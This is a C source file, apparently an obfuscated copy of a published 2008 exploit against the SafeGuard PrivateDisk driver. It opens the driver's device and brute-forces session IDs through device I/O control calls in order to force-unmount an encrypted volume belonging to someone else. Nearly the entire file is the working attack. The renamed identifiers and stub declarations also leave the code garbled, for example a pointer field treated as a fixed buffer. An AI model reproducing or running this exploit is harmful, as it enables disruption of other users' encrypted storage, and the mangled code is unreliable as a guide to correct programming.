
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct ioctl_req {char* volume_buf; int session_id; } ;
typedef int HANDLE ;
typedef int DWORD ;
typedef char CHAR ;
typedef scalar_t__ BOOL ;


 int FUNC_0 (int) ;
 int FUNC_1 (char*,int ,int,int *,int ,int ,int *) ;
 scalar_t__ FUNC_2 (int,int ,struct ioctl_req*,int,struct ioctl_req*,int,int*,int ) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ,char*,...) ;
 int FUNC_5 (char*,int ,int) ;
 int FUNC_6 (char*,...) ;
 int VAR_9 ;
 int FUNC_7 (char*,char*,int) ;

int
FUNC_8 (int VAR_10, char **VAR_11)
{
  struct ioctl_req VAR_12;
  DWORD VAR_13, VAR_14, VAR_15;
  CHAR VAR_16[0x100];
  HANDLE VAR_17;
  BOOL VAR_18;

  FUNC_6 ("Utimaco Safeware AG - SafeGuard PrivateDisk unmount exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (VAR_10 <= 1)
    {
      FUNC_4 (VAR_9, "Usage: %s <volume file>\n", VAR_11[0]);
      FUNC_3 (VAR_1);
    }

  VAR_17 = FUNC_1 ("\\\\.\\PrivateDisk", VAR_4,
                       VAR_2|VAR_3, ((void*)0),
                       VAR_6, 0, ((void*)0));
  if (VAR_17 == VAR_5)
    {
      FUNC_4 (VAR_9, "* CreateFileA failed, %d\n", VAR_17);
      FUNC_3 (VAR_0);
    }

  FUNC_5 (VAR_16, 0, sizeof VAR_16);
  FUNC_7 (VAR_16, VAR_11[1], sizeof VAR_16 - 1);

  for (VAR_13 = 0, VAR_14 = 0; VAR_13 < sizeof VAR_12.volume_buf - 4; VAR_13 += 2, VAR_14++)
    {
      VAR_12.volume_buf[VAR_13] = VAR_16[VAR_14];
      VAR_12.volume_buf[VAR_13+1] = 0x00;
    }

  for (VAR_13 = 0; VAR_13 < VAR_7; VAR_13++)
    {
      VAR_12.session_id = VAR_13;

      VAR_18 = FUNC_2 (VAR_17, VAR_8,
                                &VAR_12, sizeof VAR_12,
                                &VAR_12, sizeof VAR_12, &VAR_15, 0);
      if (VAR_18)
        {
          FUNC_6 ("* found, session_id: %d, volume name: %s", VAR_13, VAR_16);
          break;
        }

      if (!(VAR_13 % 64))
        {
          FUNC_6 ("* trying session_id: %d\r", VAR_13);
        }
    }
  FUNC_6 ("\n* done\n");

  FUNC_0 (VAR_17);

  return (VAR_1);
}
